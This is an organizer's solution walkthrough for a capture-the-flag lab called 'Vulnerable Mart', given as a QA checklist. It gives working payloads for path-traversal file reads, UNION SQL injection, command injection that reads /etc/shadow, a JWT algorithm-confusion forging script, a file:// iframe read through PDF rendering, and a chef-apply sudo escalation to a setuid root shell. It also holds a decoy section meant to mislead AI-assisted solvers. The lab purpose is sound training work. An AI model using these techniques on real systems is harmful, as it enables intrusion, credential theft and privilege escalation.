# SOLUTION.md — Expected Exploitation Path

Organizer/QA writeup for "Vulnerable Mart". This is the intended solve for every
flag, with concrete payloads. Flags are randomized per deploy (see `gen_flags.py`),
so values below are shown by their env-var name. This doubles as the QA checklist:
walk it top-to-bottom after any change.

> **Automated check:** `python solve.py` (repo root) performs every step below with
> the real exploit and reports all 8 flags (exit non-zero if any break). Use it for
> fast regression testing; this document is the human walkthrough + reference.

**Topology**
- Web app (shop): `http://<host>:8888` (host 8888 → container 80)
- Maintenance box: `<host>:50050` (separate, isolated container)
- Seller portal: `http://<host>:8889` (second app, locked behind the first + RCE)
- Portal SSH: `<host>:50022` (capstone foothold; on the portal container)

Flags and the step that yields each:
| Flag env var    | Step | Vuln |
|-----------------|------|------|
| `STAFF_FLAG`        | 5a   | LFI-found creds → staff login |
| `ADMIN_FLAG`        | 5b   | UNION SQLi → base64 decode → admin login |
| `CHECKOUT_FLAG`     | 6    | Checkout parameter tampering |
| `SHELL_FLAG`        | 7    | Port scan → command injection (separate box) |
| `SELLER_FLAG`       | 9    | Portal: register (locked key) → login → seller dashboard |
| `PORTAL_ADMIN_FLAG` | 10   | Portal: JWT RS256→HS256 algorithm confusion → admin |
| `USER_FLAG`         | 12   | Invoice PDF LFI → /var/mail creds → SSH foothold |
| `ROOT_FLAG`         | 13   | Chef `chef-apply` sudo privesc → root (end of CTF) |

---

## Step 1 — Recon: find the template hint
Load the home page and view source:
```
curl -s http://<host>:8888/ | grep -i template
```
The HTML contains an in-character hint:
```html
<!-- why do we support ?template= ??? can we remove or naw-->
```
This points at a `?template=` parameter on `/`.

## Step 2 — LFI / path traversal: read the source
The `/` route opens `templates/<template>` with no sanitization, so `../` escapes
the templates directory:
```
curl -s "http://<host>:8888/?template=../app.py"
```
Reading `app.py` reveals:
- The **staff credentials** (hardcoded literals): `staff` / `Wint3r_St0ck_R00m_2026!`
- The **SQL injection** in `/search` (f-string built `LIKE '%{q}%'`)
- The **base64** login comparison (submitted password is base64-encoded before the DB check)
- The checkout logic keys on a `promo_valid` form field

Also readable: `?template=../protected_routes.py` (shows the `/staff` and `/admin`
gates). **Intended dead-ends** (good to confirm during QA):
- `?template=../init_db.py` → 404. The seeding script is deleted at container start,
  so the admin hash can't be lifted from source (forces the SQLi).
- `?template=../database.db` → 404. Binary file fails text decode; no direct DB read.

## Step 3 — UNION-based SQL injection
The search query selects 4 columns: `name, price, description, id`. Confirm the
injection and column count, then pull the `users` table. The `name` field renders as
the card title and `description` renders as the card body, so map the interesting
columns there:
```
curl -s "http://<host>:8888/search?q=x' UNION SELECT username,2,password,4 FROM users-- -"
```
(URL-encoded: `q=x%27%20UNION%20SELECT%20username,2,password,4%20FROM%20users--%20-`)

A result card appears with the title `admin` and a base64 string in the body, e.g.
`c3VwZXJlcGljYWRtaW5wYXNzd29yZC16dW01N3AyNGRnbGdmZnYwZWs4dnF3bTR3aA==`
(the admin password, base64-encoded).

## Step 4 — Decode the admin password
The stored value is **single** base64:
```
echo 'c3VwZXJlcGljYWRtaW5wYXNzd29yZC16dW01N3AyNGRnbGdmZnYwZWs4dnF3bTR3aA==' | base64 -d
# -> superepicadminpassword-zum57p24dglgffv0ek8vqwm4wh
```
The decode yields an obviously-named password (`superepicadminpassword-` + 26 random
chars). The login route base64-encodes whatever you submit and compares it to the
stored value, so you log in with the *decoded* plaintext.

## Step 5a — Staff login → `STAFF_FLAG`
Use the credentials found via LFI in Step 2:
```
curl -s -c jar -L -d 'username=staff&password=Wint3r_St0ck_R00m_2026!' http://<host>:8888/login
```
Redirects to `/staff`, which prints `STAFF_FLAG`.

## Step 5b — Admin login → `ADMIN_FLAG`
Use `admin` + the decoded password from Step 4:
```
curl -s -c jar -L -d 'username=admin&password=<DECODED_PASSWORD>' http://<host>:8888/login
```
Redirects to `/admin`; the flag is displayed in the panel header (`ADMIN_FLAG`).

## Step 6 — Checkout parameter tampering → `CHECKOUT_FLAG`
The cart's checkout form has a visible decoy `promo_code` box and a **hidden**
`promo_valid=false` field. The server only checks `promo_valid == 'true'`.

1. Add any item to the cart (e.g. the T-shirt) so the cart session is non-empty.
2. Submit checkout while flipping the hidden field — intercept in Burp and change
   `promo_valid` to `true`, or directly:
```
curl -s -c jar -b jar http://<host>:8888/add_to_cart -d 'item_id=1' >/dev/null
curl -s -b jar -L http://<host>:8888/checkout -d 'promo_code=x&promo_valid=true'
```
The success page renders `CHECKOUT_FLAG`. (Typing anything in the visible `promo_code`
box does nothing — it's a decoy.)

## Step 7 — Command injection on the maintenance box → `SHELL_FLAG`
This is a **separate container** found by port scanning, not via the web app:
```
nmap -p- <host>      # discovers 50050 (also hinted in the admin panel)
```
Connect and inject into the `ping -c 1 <input>` handler:
```
printf '127.0.0.1; id; cat /root/flag.txt\n' | nc <host> 50050
```
`id` confirms RCE; `/root/flag.txt` contains `SHELL_FLAG`. Because this box holds no
database, no web source, and no other flags, RCE here cannot shortcut Steps 1–6.

---

## Step 8 — Unlock the Marketplace Seller Portal (second app)
The portal (`http://<host>:8889`) is **locked behind two earlier prerequisites at
once**: the app-1 admin password AND root RCE on the maintenance host.

1. As admin on app 1 (Step 5b), open the privileged page **Admin → Account Creation
   Keys** (`/admin/seller-keys`). It documents the registration-key recipe.
2. Get the `mysterioususer` shadow hash. With root RCE on the maintenance box
   (Step 7), read `/etc/shadow` and grab the `$6$...` field:
   ```
   printf '127.0.0.1; cat /etc/shadow\n' | nc <host> 50050
   # mysterioususer:$6$<salt>$<hash>:...
   ```
3. Compute the registration key:
   ```
   registration_key = SHAKE256( "<$6$salt$hash>" + "<admin_password>" )   # 512-bit, lowercase hex
   ```
   e.g. `python3 -c 'import hashlib,sys; print(hashlib.shake_256((sys.argv[1]+sys.argv[2]).encode()).hexdigest(64))' '$6$...' 'superepicadminpassword-...'`
4. Register a seller account at `http://<host>:8889/register` with any
   username/password + that key, then you're sent to the login page.

## Step 9 — Seller login → `SELLER_FLAG`
Log in at `http://<host>:8889/login` with the account you just created. The seller
dashboard displays `SELLER_FLAG`. The dashboard also shows your role
(`seller`), points at an **Admin Console** (`/admin`) you can't access, and notes
that auth uses RS256 JWTs with keys at `/.well-known/jwks.json`.

## Step 10 — JWT RS256→HS256 confusion → `PORTAL_ADMIN_FLAG`
Your `session_token` cookie is an RS256 JWT (`{"role":"seller"}`). `/admin` requires
`role=admin`. The verifier trusts the token's `alg` header and, for HS256, uses the
RSA **public key** as the HMAC secret — so forge an admin token:

1. Fetch the exact public key bytes the server uses as the secret:
   ```
   curl -s http://<host>:8889/jwt/public.pem -o pub.pem
   ```
   (`/.well-known/jwks.json` exposes the same key as a JWK.)
2. Build a token with header `{"alg":"HS256","typ":"JWT"}` and payload
   `{"username":"<you>","role":"admin"}`, HMAC-SHA256-signed using `pub.pem`'s bytes
   as the key. (`jwt_tool -X k -pk pub.pem`, or the script below.)
3. Replace your `session_token` cookie with the forged token and load `/admin` →
   `PORTAL_ADMIN_FLAG`.

Ready-to-run forge (testing):
```python
import base64, hmac, hashlib, json
pub = open('pub.pem','rb').read()                      # curl -s :8889/jwt/public.pem -o pub.pem
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')).encode())
p = b64(json.dumps({"username":"acme","role":"admin"},separators=(',',':')).encode())
si = f"{h}.{p}"
sig = b64(hmac.new(pub, si.encode(), hashlib.sha256).digest())
print(f"{si}.{sig}")                                   # set as session_token cookie
```
Note: use the **exact bytes** of `pub.pem` (curl it to a file; don't retype it) —
a stray trailing newline difference changes the HMAC.

> Built and tested.

## Step 11 — Invoice PDF → local file inclusion
As portal admin, open **Admin → Billing → Invoice Generator** (`/admin/invoices`).
The invoice fields are rendered into HTML and converted to PDF by `wkhtmltopdf`
(local-file-access enabled), so inject a `file://` iframe into the Notes field:
```html
<iframe src="file:///var/mail/jdoe" width="700" height="500"></iframe>
```
Export to PDF; the rendered PDF embeds `/var/mail/jdoe`. The renderer runs as
**www-data** with a scrubbed env, so this LFI reads world-readable files only — it
cannot read the portal's secrets or `/root/root.txt` (try `file:///etc/passwd` to
enumerate users; `jdoe` is the target). Useful reads: `/var/mail/jdoe`, `/etc/passwd`.

## Step 12 — SSH foothold → `USER_FLAG`
`/var/mail/jdoe` is an email containing `jdoe`'s SSH password. SSH to the portal
host on the high port:
```
ssh -p 50022 jdoe@<host>          # password from the leaked mail
cat ~/user.txt                    # USER_FLAG
```

## Step 13 — Chef privesc → `ROOT_FLAG` (end of CTF)
`jdoe` may run Chef as root: `sudo -l` shows `NOPASSWD: /usr/local/bin/chef-apply`
(real Chef or cinc, exposed under that stable path). `chef-apply` executes a recipe
(arbitrary Ruby) as root — a GTFOBins-style escape:
```
cat > /tmp/pwn.rb <<'EOF'
execute 'pwn' do
  command 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
end
EOF
sudo chef-apply /tmp/pwn.rb       # image pre-accepts the Chef license
/tmp/rootbash -p                  # root shell
cat /root/root.txt                # ROOT_FLAG  <- end of the CTF
```
Note: real Chef refuses to run without accepting its license; the image
pre-accepts it so the bare command works. If you ever see
`Chef Infra Client cannot execute without accepting the license`, append the flag
**after** the recipe file (placed before it, chef-apply mis-reads it as a filename):
`sudo chef-apply /tmp/pwn.rb --chef-license accept`.

---

## Red herrings (all inert — organizers: NOT part of any solve)
`web/dev.py` is a decoy module exposed via LFI (`?template=../dev.py`, a name a
pentest wordlist will enumerate) to mislead automated/AI-assisted solvers. It contains plausible-but-useless leads,
every one of which is forced off:
- `/api/v1/debug?token=<ROOT_API_KEY>` — the token is right there in the source,
  but `FEATURES["debug_console"]` is `False`, so it always returns **404** and
  leaks nothing. The `LEGACY_DB_DSN` / `ROOT_API_KEY` are fake (point at an
  unreachable internal host).
- `/api/v1/auth/elevate` — gated by `god_mode=False` **and** an HMAC check whose
  key is never set; always **403**.
- `/api/v1/promo/override` — looks like a checkout bypass; `promo_override=False`,
  always **403**, never touches the cart/session.
- `BACKDOOR_USER`/`BACKDOOR_PASS` (`support` / `Pa55w0rd!Support#2023`) — not used
  by any real auth path; rejected at `/login`.

There is no real vulnerability and no alternate flag in this file.

## QA checklist (run after any change)
- [ ] `?template=../app.py` returns source; `?template=../init_db.py` and
      `?template=../database.db` both 404.
- [ ] LFI source shows the staff password and that exact password logs in (Step 5a).
- [ ] UNION SQLi returns the admin row; base64 decode → admin login works (5b).
- [ ] Source contains **no** comments naming a vuln or the solution.
- [ ] Checkout with `promo_valid=true` returns `CHECKOUT_FLAG`; the visible
      `promo_code` box alone never succeeds.
- [ ] 50050 injection reads `SHELL_FLAG`; the maintenance container has no DB/source/other flags.
- [ ] `/search?q={{7*7}}` does NOT evaluate (SSTI removed).
- [ ] Decoy endpoints (`/api/v1/debug`, `/auth/elevate`, `/promo/override`) leak
      nothing and grant nothing; backdoor creds are rejected at `/login`.
- [ ] `/admin/seller-keys` is admin-gated (403 otherwise) and shows the recipe.
- [ ] `mysterioususer` exists on the 50050 box; `cat /etc/shadow` yields its `$6$` hash.
- [ ] `SHAKE256(shadow_hash + admin_password)` matches `REGISTRATION_KEY`, and the
      portal `/register` accepts it (and rejects wrong keys).
- [ ] Portal: register → login → dashboard shows `SELLER_FLAG`; `/admin` is 403 for sellers.
- [ ] `/jwt/public.pem` + `/.well-known/jwks.json` are reachable; an HS256 token
      signed with the public PEM grants `/admin` (`PORTAL_ADMIN_FLAG`); a
      wrong-secret token is rejected; legit RS256 seller tokens still work.
- [ ] Invoice PDF (`/admin/invoices`) is admin-only; a `file://` iframe in Notes
      includes the file in the PDF. The render runs as **www-data** — confirm it
      CANNOT read `/root/root.txt` or `/home/jdoe/user.txt` (only world-readable files).
- [ ] `/var/mail/jdoe` leaks the SSH password; `ssh -p 50022 jdoe@host` works and
      `~/user.txt` is `USER_FLAG`.
- [ ] `sudo chef-apply` runs a recipe as root; `ROOT_FLAG` is readable only after privesc.
- [ ] Each flag matches the corresponding value in `flags.env`.
